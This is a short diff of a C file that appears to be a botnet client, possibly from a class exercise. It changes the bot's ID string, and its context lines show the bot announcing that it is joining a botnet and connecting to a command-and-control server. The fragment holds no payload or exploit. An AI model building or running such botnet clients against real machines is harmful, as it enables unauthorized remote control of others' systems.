@@ -124,7 +124,7 @@ main (int argc, char* argv[])
   char  msg[MAX_BUF]; 
   int   cc_s;
 
-  bot_id = "kai";
+  bot_id = "yonatan";
  
   printf ("'%s' joining karthik's botnet\n", bot_id);
   cc_s = bot_connect_cc (CC_SERVER, CC_PORT);
